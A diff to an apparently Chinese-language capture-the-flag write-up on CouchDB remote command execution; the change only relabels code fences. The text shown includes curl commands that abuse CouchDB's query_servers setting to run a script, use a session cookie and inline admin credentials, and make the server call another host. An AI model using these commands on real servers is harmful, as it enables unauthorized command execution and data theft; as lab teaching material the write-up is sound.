@@ -37,7 +37,7 @@ CouchDB提供了一个可视化界面工具，在浏览器中运行“http://127
 2. 新建一个临时库和临时表，插入一条记录；
 3. 调用query_server处理数据
 
-```
+```basic
 curl -X PUT 'http://192.168.199.181:5984/_config/query_servers/cmd' -d '"python /tmp/back.py"'  -H "Cookie: AuthSession=YWRtaW46NTc5QTRGMjc6VKTKwNEud9fFchzR-HtOrjM5Cg4"
 
 curl -X PUT 'http://192.168.199.181:5984/teeest'  -H "Cookie: AuthSession=YWRtaW46NTc5QTRGMjc6VKTKwNEud9fFchzR-HtOrjM5Cg4"```
@@ -59,7 +59,7 @@ getshell，读取flag
 ![成功](https://urahara3389.github.io/img/Couchdb-RCE-over.png)
 > 同样你也可以不用登录获取Cookie，直接在curl请求中带入账号密码也是可以的，类似于这样，执行效果是一样的，这种方法可能更方便点吧
 
-```
+```basic
 root@Urahara:~# curl -X PUT 'admin:1qaz2wsx@192.168.199.165:5984/_config/query_servers/cmd' -d '"curl http://192.168.199.140/flag"'
 "curl http://192.168.199.140/flag"
 root@Urahara:~# curl -X PUT 'admin:1qaz2wsx@192.168.199.165:5984/wa'
